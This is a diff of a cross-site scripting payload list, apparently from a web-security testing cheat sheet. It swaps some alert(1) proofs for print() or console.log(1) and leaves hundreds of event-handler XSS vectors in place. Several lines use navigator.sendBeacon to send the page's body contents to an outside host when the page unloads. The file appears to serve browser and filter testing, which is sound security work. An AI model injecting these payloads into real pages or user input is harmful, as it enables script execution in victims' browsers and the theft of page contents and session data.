@@ -99,7 +99,7 @@
 <body onafterprint=alert(1)>
 <style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"><\/*>
 <style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"><\/*>
-<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><* id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/*>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><* id=x style=\"position:absolute;\" onanimationcancel=\"print()\"><\/*>
 <style>@keyframes x{}<\/style><* style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/*>
 <style>@keyframes slidein {}<\/style><* style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/*>
 <style>@keyframes x{}<\/style><* style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/*>
@@ -390,7 +390,7 @@ code
 <video onbeforecut=\"alert(1)\" contenteditable>test<\/video>
 <wbr onbeforecut=\"alert(1)\" contenteditable>test<\/wbr>
 <xmp onbeforecut=\"alert(1)\" contenteditable>test<\/xmp>
-<* id=x tabindex=1 onbeforedeactivate=alert(1)><\/*><input autofocus>
+<* id=x tabindex=1 onbeforedeactivate=print()><\/*><input autofocus>
 <input onbeforepaste=alert(1) value=\"\" autofocus>
 <textarea onbeforepaste=alert(1) autofocus><\/textarea>
 <a onbeforepaste=\"alert(1)\" contenteditable>test<\/a>
@@ -533,7 +533,7 @@ code
 <video onbeforepaste=\"alert(1)\" contenteditable>test<\/video>
 <wbr onbeforepaste=\"alert(1)\" contenteditable>test<\/wbr>
 <xmp onbeforepaste=\"alert(1)\" contenteditable>test<\/xmp>
-<body onbeforeprint=alert(1)>
+<body onbeforeprint=console.log(1)>
 <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
 <svg><path><animateMotion onbegin=alert(1) dur=\"1s\" repeatCount=\"1\">
 <svg><animatetransform onbegin=alert(1) attributeName=transform>
@@ -694,7 +694,7 @@ code
 <* oncopy=alert(1) value=\"XSS\" autofocus tabindex=1>test
 <* oncut=alert(1) value=\"XSS\" autofocus tabindex=1>test
 <* ondblclick=\"alert(1)\" autofocus tabindex=1>test<\/*>
-<* id=x tabindex=1 ondeactivate=alert(1)><\/*><input id=y autofocus>
+<* id=x tabindex=1 ondeactivate=print()><\/*><input id=y autofocus>
 <* draggable=\"true\" ondrag=\"alert(1)\">test<\/*>
 <* draggable=\"true\" ondragend=\"alert(1)\">test<\/*>
 <* draggable=\"true\" ondragenter=\"alert(1)\">test<\/*>
@@ -1169,7 +1169,7 @@ code
 <wbr onfocusout=alert(1) tabindex=1 id=x><\/wbr><input autofocus>
 <xmp onfocusout=alert(1) tabindex=1 id=x><\/xmp><input autofocus>
 <xss id=x tabindex=1 onfocusout=alert(1)><\/xss><input autofocus>
-<body onhashchange=\"alert(1)\">
+<body onhashchange=\"print()\">
 <input oninput=alert(1) value=xss>
 <textarea oninput=alert(1)>XSS<\/textarea>
 <form><input oninvalid=alert(1) required><input type=submit>
@@ -1209,7 +1209,7 @@ code
 <image src=validimage.png onloadstart=alert(1)>
 <picture><source srcset=\"validimage.png\"><image onloadstart=alert(1)><\/picture>
 <input type=image onloadstart=alert(1) src=validimage.png>
-<body onmessage=alert(1)>
+<body onmessage=print()>
 <* onmousedown=\"alert(1)\">test<\/*>
 <* onmouseenter=\"alert(1)\">test<\/*>
 <* onmouseleave=\"alert(1)\">test<\/*>
@@ -1375,7 +1375,7 @@ code
 <* onpointerout=alert(1)>XSS</*>
 <* onpointerup=alert(1)>XSS</*>
 <* onpointerrawupdate=alert(1)>XSS</*>
-<body onpopstate=alert(1)>
+<body onpopstate=print()>
 <applet onreadystatechange=alert(1)><\/applet>
 <iframe onreadystatechange=alert(1)><\/iframe>
 <object data=\/ onreadystatechange=alert(1)>
@@ -1387,7 +1387,7 @@ code
 <svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
 <svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
 <form onreset=alert(1)><input type=reset>
-<body onresize=\"alert(1)\">
+<body onresize=\"print()\">
 <body onscroll=alert(1)><div style=height:1000px><\/div><div id=x><\/div>
 <form><input type=search onsearch=alert(1) value=\"Hit return\" autofocus>
 <audio autoplay controls onseeked=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
@@ -1404,10 +1404,10 @@ code
 <body ontouchstart=alert(1)> 
 <body ontouchend=alert(1)> 
 <body ontouchmove=alert(1)> 
-<style>:target {color: red;}<\/style><* id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/*>
+<style>:target {color: red;}<\/style><* id=x style=\"transition:color 10s\" ontransitioncancel=print()><\/*>
 <style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)><\/*>
 <style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/*>
-<style>:target {transform: rotate(180deg);}<\/style><* id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/*>
+<style>:target {transform: rotate(180deg);}<\/style><* id=x style=\"transition:transform 2s\" ontransitionrun=print()><\/*>
 <body onunhandledrejection=alert(1)><script>fetch('\/\/xyz')<\/script>
 <svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
 <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
